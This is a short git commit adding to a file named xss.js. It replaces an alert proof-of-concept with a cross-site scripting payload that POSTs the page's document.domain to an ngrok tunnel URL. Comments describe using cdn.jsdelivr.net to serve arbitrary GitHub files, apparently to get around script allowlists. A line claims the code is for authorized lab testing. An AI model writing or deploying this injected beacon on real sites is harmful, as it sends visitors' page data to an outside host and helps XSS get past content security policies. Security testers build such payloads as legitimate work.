9267d93a8120f64d465e0b64c4c874621415e2f6
Chandra <92775815+sparrow-hkr@users.noreply.github.com>
2026-08-19 11:07:32 +0600

    Implement logging of document domain via fetch
    Added fetch request to log the document domain for testing.

--- xss.js
+++ xss.js
@@ -1,4 +1,8 @@
-alert(document.domain)
+// Example for authorized lab testing only
+fetch('https://e63a-35-238-141-240.ngrok-free.app/log/jsdelivr.net-xxx/?c=', {
+   method: 'POST',
+   body: document.domain
+});
 
 // https://cdn.jsdelivr.net/ will allow you to proxy any file on github.com
 // https://cdn.jsdelivr.net/gh/<username>/<project>/<filename>
